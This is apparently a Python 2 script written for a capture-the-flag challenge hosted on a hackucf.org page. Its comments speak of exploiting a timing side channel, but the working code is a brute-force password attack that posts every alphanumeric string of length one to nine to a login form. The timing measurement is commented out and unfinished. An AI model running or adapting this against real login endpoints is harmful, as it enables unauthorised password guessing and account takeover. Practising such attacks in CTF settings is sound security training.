## look up timing impact
## server takes longer to respond the more characters you get character
from pwn import *
from bs4 import BeautifulSoup
import urllib2
import requests
import itertools

session = requests.Session()
url = 'http://challenges.hackucf.org/easy2.php'
headers = {'User-Agent': 'Mozilla/5.0'}

r = session.get(url)

##get the 



digits = '0123456789'
alphanum = 'abcdefghijklmnopqrstuvwxyz' + digits # this should contain all the letters and digits

	
for i in xrange(1, 10):    
    for tok in  itertools.product(alphanum, repeat=i):
	passwd= ''.join(tok)
	print "password: " + passwd

	payload = {'passwd': passwd}
	response = session.post(url, data=payload)
	
	#get the current page
	#page2  = response.content 
	#soup = BeautifulSoup(page2)
	
	#find the time for the input
	#timeT = soup.findall('time')
	#print "time: " + timeT + '\n'

	
